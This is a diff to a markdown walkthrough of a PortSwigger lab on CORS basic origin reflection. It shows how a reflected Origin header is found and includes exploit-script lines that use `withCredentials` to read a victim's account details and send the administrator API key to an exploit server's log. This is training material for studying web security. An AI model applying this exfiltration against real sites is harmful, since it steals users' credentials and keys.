@@ -1,11 +1,10 @@
 # [CORS vulnerability with basic origin reflection](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack)
 
-> login the site and during the login there will be a request to the `/accountDetails`, in the response there is a header `Access-Control-Allow-Credentials: true` that indicates it might support `CORS`
+> login the site and during the login there will be a request to the `/accountDetails`, in the response there is a header `Access-Control-Allow-Credentials: true` that indicates it might support `CORS` and it let any credentials/logs cross to any other allowed origin
 
 - in Burp Repeater add to the request `Origin: https://example.com`
-- in the response it should reflect that in as a header -> `Access-Control-Allow-Origin: https://example.com`
-
-> any given `Origin: xyz` reflected in the response
+- in the response there is the header `Access-Control-Allow-Origin: https://example.com`
+- this indicates that the server (where the response comes) only cares if the cookies are right, if it is then it accepts any origin, so any given `Origin: xyz` reflected in the response
 
 > exploit ->
 
@@ -23,8 +22,8 @@
 </script>
 ```
 
-- the `req.withCredentials = true;` in the request will tell the response should send the victim credentials what will set `Access-Control-Allow-Origin: https://www.expoit-serve.com`, otherwise the browser would block the `this.responseText`
-- the `location = "/log?key=" + this.responseText;` is for the exploit server, the log page will get all the response text
+- the `req.withCredentials = true;` in the request will tell the response should send the victim credentials like the cookies, and the browser attach the origin to the request, since the that is th only credentials that the server needs it will accept the `https://www.expoit-serve.com` as origin.
+- the `location = "/log?key=" + this.responseText;` works because of the `Access-Control-Allow-Credentials: true`
 
 > deliver it to the victim and then view the exploit, in the logs there will be the administrator api key (in this lab the admin will receive the exploit)
 
